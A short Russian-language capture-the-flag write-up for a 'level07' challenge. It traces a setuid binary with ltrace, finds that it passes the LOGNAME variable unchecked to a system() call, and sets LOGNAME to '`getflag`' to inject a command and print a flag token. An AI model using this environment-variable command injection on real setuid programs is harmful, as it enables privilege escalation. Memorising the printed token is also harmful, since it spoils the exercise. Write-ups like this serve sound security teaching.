У нас в home лежит программа "level07"

-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

Владелец программы flag07

Проверяем её через ltrace

__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                 = 2007
geteuid()                                                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                       = 0
getenv("LOGNAME")                                                                         = "level07"
asprintf(0xbffff734, 0x8048688, 0xbfffff3d, 0xb7e5ee55, 0xb7fed280)                       = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 0
+++ exited (status 0) +++

Видим что вызывается метод getenv("LOGNAME") 
который запрашивает имя текущего пользователя

Дальше он использует полученные данные, отправляя их в echo для вывода.

Подменяем LOGNAME на вызов функции getflag.

export LOGNAME='`getflag`'

Запускаем программу.
Вывод: Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
